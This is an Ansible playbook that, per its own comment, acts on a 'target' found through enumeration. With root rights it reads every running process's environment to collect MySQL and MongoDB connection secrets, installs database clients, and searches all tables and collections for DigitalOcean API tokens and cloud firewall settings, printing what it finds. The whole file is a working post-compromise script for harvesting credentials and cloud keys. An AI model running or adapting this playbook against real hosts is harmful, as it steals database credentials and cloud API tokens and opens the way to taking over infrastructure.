---
# Search MySQL and MongoDB for DigitalOcean / firewall API configuration.
# Credentials are read from running process env on the target (from enumeration).
- name: Search databases for DigitalOcean config
  hosts: all
  gather_facts: false
  become: true

  tasks:
    - name: Extract MySQL and Mongo credentials from process environments
      ansible.builtin.shell: |
        set -o pipefail
        mysql_dsn=""
        mongo_uri=""
        for pid in /proc/[0-9]*/environ; do
          env=$(tr '\0' '\n' < "$pid" 2>/dev/null || true)
          if [ -z "$mysql_dsn" ]; then
            mysql_dsn=$(echo "$env" | grep '^MYSQL_DSN=' | head -1 | cut -d= -f2-)
          fi
          if [ -z "$mongo_uri" ]; then
            mongo_uri=$(echo "$env" | grep '^MONGODB_URI=' | head -1 | cut -d= -f2-)
          fi
        done
        printf 'MYSQL_DSN=%s\n' "${mysql_dsn:-}"
        printf 'MONGODB_URI=%s\n' "${mongo_uri:-}"
      args:
        executable: /bin/bash
      register: db_creds
      changed_when: false

    - name: Show credential sources found (masked)
      ansible.builtin.debug:
        msg:
          - "MySQL DSN present: {{ (db_creds.stdout_lines[0] | default('')) != 'MYSQL_DSN=' }}"
          - "Mongo URI present: {{ (db_creds.stdout_lines[1] | default('')) != 'MONGODB_URI=' }}"

    - name: Search databases for DO/firewall config
      ansible.builtin.shell: |
        set -o pipefail
        export DEBIAN_FRONTEND=noninteractive
        MYSQL_DSN=""
        MONGO_URI=""
        while IFS= read -r line; do
          case "$line" in
            MYSQL_DSN=*) MYSQL_DSN="${line#MYSQL_DSN=}" ;;
            MONGODB_URI=*) MONGO_URI="${line#MONGODB_URI=}" ;;
          esac
        done <<EOF
        {{ db_creds.stdout }}
        EOF

        DO_RE='digitalocean|doctl|do_token|do_api|dop_v1|cloud.?firewall|firewall_id|DO_FIREWALL|DOCTL'

        echo "===== DATABASE DO/FIREWALL SEARCH ====="
        echo "Host: $(hostname -f 2>/dev/null || hostname)"
        echo "Date: $(date -Iseconds)"
        echo

        # --- MySQL ---
        echo "=== MYSQL ==="
        if [ -z "$MYSQL_DSN" ]; then
          echo "SKIP: no MYSQL_DSN in process env"
        else
          user="${MYSQL_DSN%%:*}"
          rest="${MYSQL_DSN#*:}"
          pass="${rest%%@*}"
          hostportdb="${rest#*@tcp(}"
          hostport="${hostportdb%%/*}"
          host="${hostport%%:*}"
          port="${hostport##*:}"
          db="${hostportdb#*/}"
          db="${db%%)*}"

          if ! command -v mysql >/dev/null 2>&1; then
            echo "Installing mysql client..."
            apt-get update -qq && apt-get install -y -qq default-mysql-client >/dev/null 2>&1 || true
          fi

          if command -v mysql >/dev/null 2>&1; then
            echo "Connecting to ${host}:${port}/${db} as ${user}"
            tables=$(mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
              -N -e "SHOW TABLES" 2>/dev/null) || echo "MYSQL_CONNECT_FAILED"
            if [ "$tables" = "MYSQL_CONNECT_FAILED" ]; then
              echo "ERROR: could not connect to MySQL"
            else
              echo "Tables: $(echo "$tables" | wc -l)"
              echo "--- Interesting table names ---"
              echo "$tables" | grep -iE 'config|setting|secret|credential|token|key|env|firewall|digital|cloud|integration' || true
              echo "--- Column name hits ---"
              for t in $tables; do
                cols=$(mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
                  -N -e "SHOW COLUMNS FROM \`$t\`" 2>/dev/null | awk '{print $1}')
                hits=$(echo "$cols" | grep -iE "$DO_RE" || true)
                [ -n "$hits" ] && echo "TABLE $t COLS: $hits"
              done
              echo "--- Data hits (REGEXP search) ---"
              for t in $tables; do
                cols=$(mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
                  -N -e "SHOW COLUMNS FROM \`$t\`" 2>/dev/null | \
                  awk '$2 ~ /varchar|text|json|char/ {print $1}')
                for c in $cols; do
                  mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
                    -N -e "SELECT CONCAT('${t}.','${c}:', LEFT(\`$c\`, 200)) FROM \`$t\` \
                    WHERE \`$c\` REGEXP '${DO_RE}' LIMIT 5" 2>/dev/null || true
                done
              done
            fi
          else
            echo "SKIP: mysql client not available"
          fi
        fi

        echo
        echo "=== MONGODB ==="
        if [ -z "$MONGO_URI" ]; then
          echo "SKIP: no MONGODB_URI in process env"
        else
          if ! command -v mongosh >/dev/null 2>&1; then
            if ! command -v mongo >/dev/null 2>&1; then
              echo "Installing mongosh..."
              apt-get update -qq && apt-get install -y -qq mongodb-mongosh >/dev/null 2>&1 || true
            fi
          fi
          MONGO_CMD=""
          command -v mongosh >/dev/null 2>&1 && MONGO_CMD=mongosh
          command -v mongo >/dev/null 2>&1 && MONGO_CMD=mongo
          if [ -z "$MONGO_CMD" ]; then
            echo "SKIP: mongosh/mongo not available"
          else
            echo "Connecting via $MONGO_CMD"
            $MONGO_CMD "$MONGO_URI" --quiet --eval '
              const re = /digitalocean|doctl|do_token|do_api|dop_v1|cloud.?firewall|firewall_id|DO_FIREWALL|DOCTL/i;
              const db = db.getSiblingDB(db.getName());
              print("Database: " + db.getName());
              const cols = db.getCollectionNames();
              print("Collections: " + cols.length);
              print("--- Interesting collection names ---");
              cols.filter(c => /config|setting|secret|credential|token|key|env|firewall|digital|cloud|integration/i.test(c))
                  .forEach(c => print(c));
              print("--- Document/key hits ---");
              let hits = 0;
              cols.forEach(c => {
                db.getCollection(c).find().limit(300).forEach(doc => {
                  const s = JSON.stringify(doc);
                  if (re.test(s)) {
                    hits++;
                    print(c + ": " + s.substring(0, 250));
                  }
                });
              });
              if (hits === 0) print("No DO/firewall matches in scanned documents");
            ' 2>&1 || echo "MONGO_CONNECT_FAILED"
          fi
        fi
      args:
        executable: /bin/bash
      register: db_search
      changed_when: false
      failed_when: false
      no_log: false

    - name: Print database search report
      ansible.builtin.debug:
        var: db_search.stdout_lines
